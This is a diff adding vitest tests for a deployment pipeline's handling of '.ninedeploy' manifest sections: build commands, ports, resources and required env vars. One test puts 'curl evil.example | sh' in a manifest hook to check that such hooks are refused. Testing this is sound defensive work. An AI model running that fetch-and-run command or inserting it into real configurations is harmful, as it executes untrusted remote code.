@@ -1,4 +1,4 @@
-﻿import { mkdirSync, mkdtempSync, rmSync } from 'node:fs';
+﻿import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import { afterAll, afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
@@ -1238,5 +1238,134 @@ describe('runDeployment finalize: blue-green vs in-place redeploys', () => {
     expect(h.builder.stop).not.toHaveBeenCalledWith('c-new', expect.anything());
     const svcRunning = updates.filter((u) => u.table === services && u.values.status === 'running').at(-1);
     expect(svcRunning?.values.runtimeId).toBe('c-new');
+  });
+});
+
+// ── `.ninedeploy` build-shaping sections ───────────────────────────────────
+//
+// Until 0.3.5 the pipeline applied only the manifest's OPERATIONAL sections
+// (routes/database/alerts) and dropped `build`, `run`, `resources` and
+// `env.required` on the floor, even though the schema, the CLI validator and
+// the web Manifest Creator all accepted them.
+describe('runDeployment applies the .ninedeploy build sections', () => {
+  /** Write a manifest (one YAML line per array entry) into the work dir. */
+  function writeManifest(lines: string[]) {
+    const dir = path.join(reposDir, '5');
+    mkdirSync(dir, { recursive: true });
+    writeFileSync(path.join(dir, '.ninedeploy'), lines.join('\n'), 'utf8');
+  }
+
+  const BUILD_CONFIG = {
+    id: 1,
+    serviceId: 5,
+    buildPack: 'auto',
+    baseDir: '/',
+    installCmd: null,
+    buildCmd: null,
+    startCmd: null,
+    dockerfilePath: null,
+    preDeployCmd: null,
+    postDeployCmd: null,
+    preStopCmd: null,
+    restartPolicy: 'unless-stopped',
+    stopGraceSeconds: 5,
+  };
+
+  const repoService = { image: null, repoUrl: 'https://example.test/app.git' };
+
+  it('folds build commands into the BuildContext and hands the manifest to the builder', async () => {
+    writeManifest(['version: "1"', 'build:', '  install: npm ci', '  start: node server.js']);
+    const { db } = makeDb();
+    baseSetup(db, repoService);
+    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
+    const lines = collectLogs(1);
+
+    await runDeployment(db as never, 1);
+
+    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as {
+      buildConfig: Record<string, unknown>;
+      manifest?: Record<string, unknown>;
+    };
+    expect(ctx.buildConfig).toMatchObject({ installCmd: 'npm ci', startCmd: 'node server.js' });
+    // The raw manifest travels too: `runtime`/`phases` cannot be expressed as
+    // a BuildConfig and are rendered into nixpacks.toml by the builder.
+    expect(ctx.manifest).toMatchObject({ version: '1' });
+    expect(lines.some((l) => l.includes('.ninedeploy build config'))).toBe(true);
+  });
+
+  it('lets a panel value win over the manifest', async () => {
+    writeManifest(['version: "1"', 'build:', '  install: npm ci']);
+    const { db } = makeDb();
+    baseSetup(db, repoService);
+    db.query.buildConfigs.findFirst.mockResolvedValue({ ...BUILD_CONFIG, installCmd: 'pnpm i' });
+
+    await runDeployment(db as never, 1);
+
+    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { buildConfig: Record<string, unknown> };
+    expect(ctx.buildConfig.installCmd).toBe('pnpm i');
+  });
+
+  it('fills resources and run.port only where the panel left them unset', async () => {
+    writeManifest([
+      'version: "1"',
+      'run:',
+      '  port: 8080',
+      '  healthcheck: /healthz',
+      'resources:',
+      '  cpuShares: 512',
+      '  memMb: 256',
+    ]);
+    const { db } = makeDb();
+    baseSetup(db, { ...repoService, port: null, healthPath: '/', cpuShares: 0, memLimitMb: 0 });
+    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
+    const lines = collectLogs(1);
+
+    await runDeployment(db as never, 1);
+
+    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { service: Record<string, unknown> };
+    expect(ctx.service).toMatchObject({ port: 8080, healthPath: '/healthz', cpuShares: 512, memLimitMb: 256 });
+    expect(lines.some((l) => l.includes('.ninedeploy runtime config'))).toBe(true);
+  });
+
+  it('leaves panel-set resources and port alone', async () => {
+    writeManifest(['version: "1"', 'run:', '  port: 8080', 'resources:', '  cpuShares: 512']);
+    const { db } = makeDb();
+    baseSetup(db, { ...repoService, port: 3000, cpuShares: 1024, memLimitMb: 512 });
+    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
+
+    await runDeployment(db as never, 1);
+
+    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { service: Record<string, unknown> };
+    expect(ctx.service).toMatchObject({ port: 3000, cpuShares: 1024, memLimitMb: 512 });
+  });
+
+  it('refuses manifest-declared lifecycle hooks and says why', async () => {
+    writeManifest(['version: "1"', 'hooks:', '  preBuild: curl evil.example | sh']);
+    const { db } = makeDb();
+    baseSetup(db, repoService);
+    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
+    const lines = collectLogs(1);
+
+    await runDeployment(db as never, 1);
+
+    const ctx = h.builder.buildAndRun.mock.calls.at(-1)![0] as { buildConfig: Record<string, unknown> };
+    expect(ctx.buildConfig.preDeployCmd).toBeNull();
+    expect(lines.some((l) => l.includes('hooks are ignored'))).toBe(true);
+  });
+
+  it('warns about a declared required env var that is not set', async () => {
+    // The classic "container boots, then crashes" failure. Warned rather than
+    // failed: the value may legitimately come from the image itself.
+    writeManifest(['version: "1"', 'env:', '  required:', '    - API_KEY']);
+    const { db } = makeDb();
+    baseSetup(db, repoService);
+    db.query.buildConfigs.findFirst.mockResolvedValue(BUILD_CONFIG);
+    const lines = collectLogs(1);
+
+    await runDeployment(db as never, 1);
+
+    expect(lines.some((l) => l.includes('required env "API_KEY"'))).toBe(true);
+    // A warning must not stop the deploy.
+    expect(lines).toContain('✓ Deployment successful');
   });
 });
